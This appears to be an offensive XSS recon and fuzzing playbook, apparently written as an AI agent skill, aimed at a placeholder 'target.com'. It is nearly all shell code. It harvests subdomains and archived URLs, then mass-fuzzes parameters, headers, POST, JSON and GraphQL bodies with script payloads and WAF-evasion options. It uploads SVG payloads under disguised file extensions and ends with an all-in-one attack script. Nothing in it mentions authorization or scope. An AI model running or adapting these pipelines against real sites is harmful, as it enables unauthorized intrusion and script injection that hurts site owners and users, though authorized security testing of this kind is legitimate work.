# Recon, Fuzzing & Parameter Discovery Playbook

## Phase 0: URL Collection Pipeline (3 Methods)

### Method A: Subdomain + URL Collection
```bash
# Gather subdomains
echo target.com | subfinder -silent | tee subs.txt
assetfinder --subs-only target.com >> subs.txt
amass enum -passive -d target.com -o amass.txt

# Probe for live hosts
cat subs.txt | httpx -silent -o live.txt

# Collect URLs from archives
cat live.txt | waybackurls > wayback.txt
cat live.txt | gau --o gau.txt
katana -list live.txt -jc -kf all -o katana.txt
gauplus -t 5 target.com > gauplus.txt
hakrawler -url https://target.com -depth 3 -plain > hakrawler.txt

# Combine and deduplicate
cat wayback.txt gau.txt katana.txt gauplus.txt hakrawler.txt | sort -u > all-urls.txt

# Filter to URLs with parameters (fuzz targets)
grep -aE '(\?|\&)[a-z]+=' all-urls.txt | sort -u > fuzz-targets.txt
```

### Method B: One-Liner Fuzz Pipeline (Fast)
```bash
# Direct nuclei fuzzing from wayback+gau
echo target.com | waybackurls | grep '?' | sort -u | \
  nuclei -dast -t ~/nuclei-templates/http/exposures/dast/xss/ -o xss-hits.txt
```

### Method C: Full Pipeline (Thorough)
```bash
subfinder -d target.com -silent | httpx -silent > live.txt && \
cat live.txt | waybackurls > wayback.txt && \
cat live.txt | gau >> wayback.txt && \
katana -list live.txt -jc -kf all -o katana.txt && \
cat wayback.txt katana.txt | sort -u | grep '?' > fuzz-targets.txt && \
echo "[+] $(wc -l < fuzz-targets.txt) fuzz targets found" && \
nuclei -l fuzz-targets.txt -dast -t ~/nuclei-templates/http/exposures/dast/xss/ \
  -o nuclei-xss.txt && \
dalfox file fuzz-targets.txt --waf-evasion --deep-domxss -o dalfox-xss.txt
```

## Phase 1: Parameter Extraction
```bash
# Extract all parameter names
cat fuzz-targets.txt | grep -oP '[\?&]\K[^=]+' | sort -u > params.txt

# Common XSS-sensitive parameters (pre-filter for manual testing)
grep -iE '(q|s|search|query|term|page|id|url|redirect|return|next|file|load|read|view|path|name|msg|text|title|message|error|callback|jsonp|debug|token|data|input|keyword|category|tag|author|type|ref|src|href|action|formaction|post|comment|body|content|desc|description|subject|email|phone|address|city|state|zip|country)' fuzz-targets.txt > xss-params.txt
```

## Phase 2: Automated Fuzzing (Multiple Engines)

### Nuclei DAST XSS Fuzzing
```bash
# Run ALL XSS fuzzing templates
nuclei -l fuzz-targets.txt -dast \
  -t ~/nuclei-templates/http/exposures/dast/xss/ \
  -t ~/nuclei-templates/http/vulnerabilities/xss/ \
  -stats -o nuclei-xss.txt

# Run with WAF bypass
nuclei -l fuzz-targets.txt -dast \
  -t ~/nuclei-templates/http/exposures/dast/xss/ \
  -H "User-Agent: Mozilla/5.0" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -stats -o nuclei-xss-bypass.txt
```

### Dalfox (Automated XSS Scanner)
```bash
# Single URL
dalfox url https://target.com/page?param=test --waf-evasion --deep-domxss

# Bulk file
dalfox file fuzz-targets.txt \
  --waf-evasion \
  --deep-domxss \
  --mining-dict \
  --mining-words \
  --skip-bav \
  --only-custom-payload \
  --output dalfox-xss.txt

# With headers
dalfox url https://target.com/page?param=test \
  -H "Cookie: session=abc" \
  --waf-evasion \
  --worker 10
```

### kxss + Gxss (Reflection Detection)
```bash
# kxss — detects reflected params
cat fuzz-targets.txt | kxss | grep "Vulnerable" > kxss-reflected.txt

# Gxss — reflection analysis
cat fuzz-targets.txt | Gxss -p XSS -o gxss-reflected.txt
cat gxss-reflected.txt | grep "Reflection found" > reflected-params.txt
```

### ffuf (Custom Fuzzing)
```bash
# Fuzz single param
ffuf -u https://target.com/page?param=PROBE123 \
  -w params.txt:PARAM \
  -w xss-payloads.txt:PAYLOAD \
  -mr "alert|prompt|confirm" \
  -t 50

# Fuzz all params simultaneously
ffuf -u https://target.com/page?FUZZ=PROBE123 \
  -w params.txt \
  -mr "PROBE123" \
  -t 100 \
  -o ffuf-reflection.json

# POST body fuzzing
ffuf -u https://target.com/page \
  -X POST \
  -d "param=PROBE123" \
  -w params.txt:PARAM \
  -mr "PROBE123"
```

### X8 (Hidden Param Discovery)
```bash
# Discover hidden params
x8 -u https://target.com/page \
  -w params.txt \
  -o x8-results.txt

# With wordlist
x8 -u https://target.com/page \
  --words /usr/share/wordlists/xss-params.txt \
  -o x8-hidden.txt
```

## Phase 3: Header Fuzzing
```bash
# Test all common HTTP headers for reflection
for header in \
  "User-Agent" \
  "Referer" \
  "X-Forwarded-For" \
  "X-Forwarded-Host" \
  "X-Real-IP" \
  "CF-Connecting-IP" \
  "True-Client-IP" \
  "X-Original-URL" \
  "X-Rewrite-URL" \
  "X-HTTP-Method-Override" \
  "X-HTTP-Host-Override" \
  "X-Forwarded-Proto" \
  "X-Forwarded-Port" \
  "Forwarded" \
  "Via" \
  "X-Client-IP" \
  "X-Cluster-Client-IP" \
  "X-Remote-IP" \
  "X-Remote-Addr" \
  "Client-IP" \
  "Origin" \
  "X-WAP-Profile" \
  ; do
  result=$(curl -sk -H "$header: PROBE123" -o /dev/null -w "%{http_code}" "https://target.com/page" 2>/dev/null)
  content=$(curl -sk -H "$header: PROBE123" "https://target.com/page" 2>/dev/null)
  if echo "$content" | grep -q "PROBE123"; then
    echo "[+] $header REFLECTED ($result)"
  fi
done

# Fuzz headers with nuclei
nuclei -l live.txt -t ~/nuclei-templates/http/exposures/config/xss-headers.yaml
```

## Phase 4: POST Body & API Fuzzing
```bash
# Fuzz POST params
cat params.txt | while read param; do
  curl -sk -X POST "https://target.com/api/endpoint" \
    -d "$param=<script>alert(1)</script>" \
    -o /dev/null -w "%{http_code}"
done

# JSON body fuzzing
curl -sk -X POST "https://target.com/api/endpoint" \
  -H "Content-Type: application/json" \
  -d '{"param": "<script>alert(1)</script>"}'

# GraphQL fuzzing
curl -sk -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { user(id: \"<script>alert(1)</script>\") { name } }"}'

# Multipart fuzzing
curl -sk -X POST "https://target.com/upload" \
  -F "file=@xss.svg;filename=xss.svg" \
  -F "param=<script>alert(1)</script>"
```

## Phase 5: Custom Payload Fuzzing with ffuf
```bash
# Prepare payload wordlist from any source
curl -s https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt | \
  grep -v "^#" | grep -v "^$" > xss-payloads.txt

# Or use the elite payloads
cat /home/chinnuy93/.agents/skills/xss-elite/payloads/html-context.txt \
  /home/chinnuy93/.agents/skills/xss-elite/payloads/attribute-context.txt \
  /home/chinnuy93/.agents/skills/xss-elite/payloads/polyglots.txt \
  | grep -v "^#" | grep -v "^$" > elite-payloads.txt

# Fuzz with custom payloads
ffuf -u https://target.com/page?param=PAYLOAD \
  -w elite-payloads.txt \
  -mr "alert|prompt|confirm|document" \
  -t 50 \
  -o ffuf-xss.json
```

## Phase 6: Upload Endpoint Fuzzing
```bash
# Discover upload endpoints
grep -iE 'upload|file|attach|image|avatar|profile|cover|signature|resume|document|media|csv|import|export' \
  all-urls.txt > upload-endpoints.txt

# Fuzz upload with SVG payload
for url in $(cat upload-endpoints.txt); do
  curl -sk -X POST "$url" \
    -F "file=@/tmp/xss.svg;filename=xss.svg" \
    -F "file=@/tmp/xss.svg;filename=xss.svg.png" \
    -F "file=@/tmp/xss.svg;filename=xss.svg;.jpg" \
    -F "file=@/tmp/xss.svg;filename=xss.html" \
    -o /dev/null -w "$url -> %{http_code}\n"
done
```

## Phase 7: Auto-Fuzz Script (All-in-One)
```bash
#!/bin/bash
# xss-fuzz.sh — Full auto fuzzing pipeline
TARGET=$1
THREADS=${2:-50}

echo "[*] Starting XSS fuzz for $TARGET"

# 1. Collect URLs
echo "[*] Collecting URLs..."
subfinder -d $TARGET -silent | httpx -silent > .live.txt
cat .live.txt | waybackurls > .urls.txt
cat .live.txt | gau >> .urls.txt
katana -list .live.txt -jc -kf all >> .urls.txt
sort -u .urls.txt -o .urls.txt

# 2. Filter fuzz targets
grep -aE '\?|&' .urls.txt | sort -u > .fuzz.txt
echo "[+] $(wc -l < .fuzz.txt) fuzz targets"

# 3. Run nuclei DAST XSS
echo "[*] Running nuclei DAST XSS..."
nuclei -l .fuzz.txt -dast \
  -t ~/nuclei-templates/http/exposures/dast/xss/ \
  -stats -o nuclei-xss.txt 2>/dev/null

# 4. Run dalfox
echo "[*] Running dalfox..."
dalfox file .fuzz.txt --waf-evasion --deep-domxss -o dalfox-xss.txt 2>/dev/null

# 5. Run kxss
echo "[*] Running kxss..."
cat .fuzz.txt | kxss | grep -i "vuln\|xss" > kxss-results.txt

# 6. Check for reflected params with ffuf
echo "[*] Checking reflections..."
cat .fuzz.txt | grep -oP '[\?&]\K[^=]+' | sort -u > .params.txt
ffuf -u https://$TARGET/page?FUZZ=PROBE123 \
  -w .params.txt -mr "PROBE123" -t $THREADS \
  -o ffuf-reflection.json 2>/dev/null

# Results summary
echo ""
echo "===== XSS FUZZ RESULTS ====="
echo "Nuclei hits: $(wc -l < nuclei-xss.txt 2>/dev/null || echo 0)"
echo "Dalfox hits: $(wc -l < dalfox-xss.txt 2>/dev/null || echo 0)"
echo "kxss hits:   $(wc -l < kxss-results.txt 2>/dev/null || echo 0)"
echo "============================="
```
